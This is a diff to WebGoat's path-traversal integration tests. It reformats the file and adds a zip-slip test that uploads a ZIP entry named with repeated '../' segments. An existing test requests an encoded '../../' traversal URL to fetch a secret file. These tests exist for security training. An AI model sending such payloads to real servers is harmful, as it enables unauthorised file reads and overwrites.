@@ -1,14 +1,7 @@
 package org.owasp.webgoat;
 
-import static org.junit.jupiter.api.DynamicTest.dynamicTest;
-
-import java.io.File;
-import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.util.Arrays;
-import java.util.Map;
-
+import io.restassured.RestAssured;
+import lombok.SneakyThrows;
 import org.hamcrest.CoreMatchers;
 import org.hamcrest.MatcherAssert;
 import org.junit.jupiter.api.AfterEach;
@@ -18,38 +11,49 @@ import org.junit.jupiter.api.TestFactory;
 import org.junit.jupiter.api.io.TempDir;
 import org.springframework.security.core.token.Sha512DigestUtils;
 
-import io.restassured.RestAssured;
-import lombok.SneakyThrows;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.Arrays;
+import java.util.Map;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+import static org.junit.jupiter.api.DynamicTest.dynamicTest;
 
 public class PathTraversalTest extends IntegrationTest {
-        
-	//the JUnit5 way
+
+    //the JUnit5 way
     @TempDir
     Path tempDir;
-    
+
     private File fileToUpload = null;
-    
+
     @BeforeEach
     @SneakyThrows
     public void init() {
-    	fileToUpload = Files.createFile(
+        fileToUpload = Files.createFile(
                 tempDir.resolve("test.jpg")).toFile();
-    	Files.write(fileToUpload.toPath(), "This is a test" .getBytes());
-    	startLesson("PathTraversal");
+        Files.write(fileToUpload.toPath(), "This is a test".getBytes());
+        startLesson("PathTraversal");
     }
 
     @TestFactory
     Iterable<DynamicTest> testPathTraversal() {
-    	return Arrays.asList(
-    			dynamicTest("assignment 1 - profile upload",()-> assignment1()),
-    			dynamicTest("assignment 2 - profile upload fix",()-> assignment2()),
-    			dynamicTest("assignment 3 - profile upload remove user input",()-> assignment3()),
-    			dynamicTest("assignment 4 - profile upload random pic",()-> assignment4())
-    			);
+        return Arrays.asList(
+                dynamicTest("assignment 1 - profile upload", () -> assignment1()),
+                dynamicTest("assignment 2 - profile upload fix", () -> assignment2()),
+                dynamicTest("assignment 3 - profile upload remove user input", () -> assignment3()),
+                dynamicTest("assignment 4 - profile upload random pic", () -> assignment4()),
+                dynamicTest("assignment 5 - zip slip", () -> assignment5())
+        );
     }
-    
+
     public void assignment1() throws IOException {
-    	MatcherAssert.assertThat(
+        MatcherAssert.assertThat(
                 RestAssured.given()
                         .when()
                         .relaxedHTTPSValidation()
@@ -63,7 +67,7 @@ public class PathTraversalTest extends IntegrationTest {
     }
 
     public void assignment2() throws IOException {
-    	MatcherAssert.assertThat(
+        MatcherAssert.assertThat(
                 RestAssured.given()
                         .when()
                         .relaxedHTTPSValidation()
@@ -77,7 +81,7 @@ public class PathTraversalTest extends IntegrationTest {
     }
 
     public void assignment3() throws IOException {
-    	MatcherAssert.assertThat(
+        MatcherAssert.assertThat(
                 RestAssured.given()
                         .when()
                         .relaxedHTTPSValidation()
@@ -88,6 +92,7 @@ public class PathTraversalTest extends IntegrationTest {
                         .statusCode(200)
                         .extract().path("lessonCompleted"), CoreMatchers.is(true));
     }
+
     public void assignment4() throws IOException {
         var uri = "/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret";
         RestAssured.given().urlEncodingEnabled(false)
@@ -101,10 +106,34 @@ public class PathTraversalTest extends IntegrationTest {
 
         checkAssignment("/WebGoat/PathTraversal/random", Map.of("secret", Sha512DigestUtils.shaHex(getWebgoatUser())), true);
     }
-    
+
+    public void assignment5() throws IOException {
+        var webGoatHome = System.getProperty("user.dir") + "/target/.webgoat/PathTraversal/" + getWebgoatUser();
+        webGoatHome = webGoatHome.replaceAll("^[a-zA-Z]:", ""); //Remove C: from the home directory on Windows
+
+        var webGoatDirectory = new File(webGoatHome);
+        var zipFile = new File(webGoatDirectory, "upload.zip");
+        try (var zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
+            ZipEntry e = new ZipEntry("../../../../../../../../../../" + webGoatDirectory.toString() + "/image.jpg");
+            zos.putNextEntry(e);
+            zos.write("test".getBytes(StandardCharsets.UTF_8));
+        }
+        MatcherAssert.assertThat(
+                RestAssured.given()
+                        .when()
+                        .relaxedHTTPSValidation()
+                        .cookie("JSESSIONID", getWebGoatCookie())
+                        .multiPart("uploadedFileZipSlip", "upload.zip", Files.readAllBytes(zipFile.toPath()))
+                        .post("/WebGoat/PathTraversal/zip-slip")
+                        .then()
+                        .statusCode(200)
+                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
+
+    }
+
     @AfterEach
     public void shutdown() {
-    	//this will run only once after the list of dynamic tests has run, this is to test if the lesson is marked complete
-    	checkResults("/PathTraversal");
+        //this will run only once after the list of dynamic tests has run, this is to test if the lesson is marked complete
+        checkResults("/PathTraversal");
     }
 }
